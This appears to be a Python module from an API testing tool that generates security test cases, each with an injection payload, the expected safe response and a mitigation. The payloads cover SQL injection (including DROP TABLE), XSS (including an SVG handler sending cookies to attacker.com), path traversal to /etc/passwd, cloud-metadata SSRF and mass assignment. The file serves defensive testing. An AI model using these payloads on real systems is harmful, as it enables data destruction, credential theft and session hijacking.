"""
Security & Injection Vectors Engine:
Generates selected security review payloads for SQL injection, XSS, path
traversal, SSRF, and mass assignment. This is not a vulnerability scanner or
complete OWASP coverage.
"""

from typing import List
from edgespec.models import ExtractedParam, TestCase, Category, Severity, ParamType


class SecurityEngine:
    @classmethod
    def generate(cls, param: ExtractedParam) -> List[TestCase]:
        tests: List[TestCase] = []
        p_name = param.name
        p_type = param.param_type

        # 1. SQL Injection Vectors
        if p_type in [ParamType.STRING, ParamType.EMAIL, ParamType.INTEGER, ParamType.UNKNOWN]:
            tests.append(
                TestCase(
                    id=f"{p_name}_sec_sqli_tautology",
                    target_param=p_name,
                    category=Category.SECURITY,
                    severity=Severity.CRITICAL,
                    title="SQL Injection: Tautology Authentication Bypass",
                    payload="' OR '1'='1' --",
                    payload_display="\"' OR '1'='1' --\"",
                    expected_status="HTTP 400 Bad Request / Escaped Parameter",
                    expected_behavior="Treated as literal string literal; never interpolated into raw query syntax.",
                    technical_rationale="OWASP A03:2021-Injection. Unparameterized queries allow attackers to bypass login or dump tables.",
                    mitigation="Always use parameterized queries (PreparedStatements) or ORM abstractions.",
                )
            )

            tests.append(
                TestCase(
                    id=f"{p_name}_sec_sqli_stacked",
                    target_param=p_name,
                    category=Category.SECURITY,
                    severity=Severity.CRITICAL,
                    title="SQL Injection: Stacked Destructive Query Execution",
                    payload="1; DROP TABLE transactions; --",
                    payload_display='"1; DROP TABLE transactions; --"',
                    expected_status="HTTP 400 Bad Request / Sanitized Input",
                    expected_behavior="Query executor disallows multi-statement execution and handles input safely.",
                    technical_rationale="Attempts to append a secondary destructive query to the primary statement.",
                    mitigation="Disable multi-query execution flags in database connection pool configuration.",
                )
            )

        # 2. Cross-Site Scripting (XSS)
        if p_type in [ParamType.STRING, ParamType.UNKNOWN]:
            tests.append(
                TestCase(
                    id=f"{p_name}_sec_xss_stored_script",
                    target_param=p_name,
                    category=Category.SECURITY,
                    severity=Severity.HIGH,
                    title="Stored XSS: Script Tag Payload",
                    payload="<script>alert(document.domain)</script>",
                    payload_display='"<script>alert(document.domain)</script>"',
                    expected_status="HTTP 200 OK (HTML-encoded) / HTTP 422",
                    expected_behavior="Stored as entity-encoded string (`&lt;script&gt;`) or rejected. Must never render as active DOM.",
                    technical_rationale="OWASP A03:2021-Injection. Can execute arbitrary JavaScript in victim sessions to exfiltrate cookies/tokens.",
                    mitigation="Use context-aware HTML output encoding (React JSX defaults) and implement strict Content-Security-Policy (CSP).",
                )
            )

            tests.append(
                TestCase(
                    id=f"{p_name}_sec_xss_svg_event",
                    target_param=p_name,
                    category=Category.SECURITY,
                    severity=Severity.HIGH,
                    title="Inline SVG Event Handler XSS",
                    payload="<svg onload=\"fetch('https://attacker.com/steal?c='+document.cookie)\">",
                    payload_display='"<svg onload=\\"fetch(...)//\\">"',
                    expected_status="HTTP 200 OK (Clean) / HTTP 422",
                    expected_behavior="Sanitized via DOMPurify or server HTML purifier to strip SVG event handlers.",
                    technical_rationale="Bypasses simplistic `<script>` tag filters by embedding JavaScript in SVG XML handlers.",
                    mitigation="Disallow raw HTML storage or use robust sanitizer like DOMPurify / bleach.",
                )
            )

        # 3. Path Traversal & LFI
        if p_type in [ParamType.STRING, ParamType.FILE] or "file" in p_name.lower() or "path" in p_name.lower():
            tests.append(
                TestCase(
                    id=f"{p_name}_sec_path_traversal",
                    target_param=p_name,
                    category=Category.SECURITY,
                    severity=Severity.CRITICAL,
                    title="Directory Path Traversal (../../../../etc/passwd)",
                    payload="../../../../etc/passwd",
                    payload_display='"../../../../etc/passwd"',
                    expected_status="HTTP 400 Bad Request / 403 Forbidden",
                    expected_behavior="Filename normalized to base name; traversal sequences stripped or rejected.",
                    technical_rationale="OWASP A01:2021-Broken Access Control. Exposes sensitive system configuration and private keys.",
                    mitigation="Store files under randomized UUID keys and never use user-supplied paths directly in filesystem calls.",
                )
            )

            tests.append(
                TestCase(
                    id=f"{p_name}_sec_null_byte_extension_spoof",
                    target_param=p_name,
                    category=Category.SECURITY,
                    severity=Severity.HIGH,
                    title="Null Byte Extension Truncation (avatar.png%00.php)",
                    payload="avatar.png\x00.php",
                    payload_display='"avatar.png\\x00.php"',
                    expected_status="HTTP 400 Bad Request / 422",
                    expected_behavior="Rejected due to illegal null character in filename string.",
                    technical_rationale="Bypasses extension whitelisting in legacy C-backed file readers.",
                    mitigation="Validate file contents via magic bytes (file signature) rather than file extension alone.",
                )
            )

        # 4. SSRF (Server-Side Request Forgery)
        if "url" in p_name.lower() or "link" in p_name.lower() or "webhook" in p_name.lower() or "host" in p_name.lower():
            tests.append(
                TestCase(
                    id=f"{p_name}_sec_ssrf_cloud_metadata",
                    target_param=p_name,
                    category=Category.SECURITY,
                    severity=Severity.CRITICAL,
                    title="SSRF: Cloud Provider Metadata Exfiltration (169.254.169.254)",
                    payload="http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                    payload_display='"http://169.254.169.254/latest/meta-data/..."',
                    expected_status="HTTP 422 / Blocked Internal IP",
                    expected_behavior="Outbound network request immediately blocked by URL whitelist / egress firewall.",
                    technical_rationale="OWASP A10:2021-Server-Side Request Forgery. Steals cloud IAM instance credentials.",
                    mitigation="Block outbound traffic to link-local (`169.254.0.0/16`) and private RFC-1918 subnets.",
                )
            )

            tests.append(
                TestCase(
                    id=f"{p_name}_sec_ssrf_loopback_probe",
                    target_param=p_name,
                    category=Category.SECURITY,
                    severity=Severity.HIGH,
                    title="SSRF: Localhost Loopback Port Probe (http://127.0.0.1:8080)",
                    payload="http://127.0.0.1:8080/internal/metrics",
                    payload_display='"http://127.0.0.1:8080/internal/metrics"',
                    expected_status="HTTP 422 Unprocessable Entity",
                    expected_behavior="Rejected as forbidden private network target.",
                    technical_rationale="Probes internal microservices or admin ports not exposed to the public internet.",
                    mitigation="Resolve DNS and reject any host resolving to loopback (`127.0.0.0/8`).",
                )
            )

        # 5. Mass Assignment & IDOR Parameter Tampering
        tests.append(
            TestCase(
                id=f"{p_name}_sec_mass_assignment_privilege_escalation",
                target_param=p_name,
                category=Category.SECURITY,
                severity=Severity.CRITICAL,
                title="Mass Assignment / Privilege Escalation Injection",
                payload={"role": "SUPERADMIN", "is_admin": True, "balance": 999999},
                payload_display='{"role": "SUPERADMIN", "is_admin": true}',
                expected_status="HTTP 422 / Unrecognized fields dropped",
                expected_behavior="Disallowed fields ignored or request rejected with schema validation failure.",
                technical_rationale="OWASP A01:2021. Bypasses authorization by injecting protected fields directly into entity binders.",
                mitigation="Use dedicated request DTOs with explicit allowed property whitelists.",
            )
        )

        return tests
